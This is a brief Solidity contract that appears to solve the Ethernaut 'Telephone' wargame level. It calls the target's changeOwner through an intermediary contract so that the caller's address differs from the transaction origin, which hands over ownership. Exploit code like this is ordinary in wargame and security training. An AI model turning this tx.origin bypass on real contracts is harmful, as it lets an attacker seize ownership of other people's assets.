// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "hardhat/console.sol";

interface IDeployedInstance {
  function changeOwner(address _owner) external;
}

contract EthernautTelephone {
    IDeployedInstance public instanceContract;
    address newOwner;

    constructor(address instanceContractAddress, address _newOwner) {
        newOwner = _newOwner;
        instanceContract = IDeployedInstance(instanceContractAddress);
    }

    function safeChangeOwner() external {
        instanceContract.changeOwner(newOwner);
    }
}
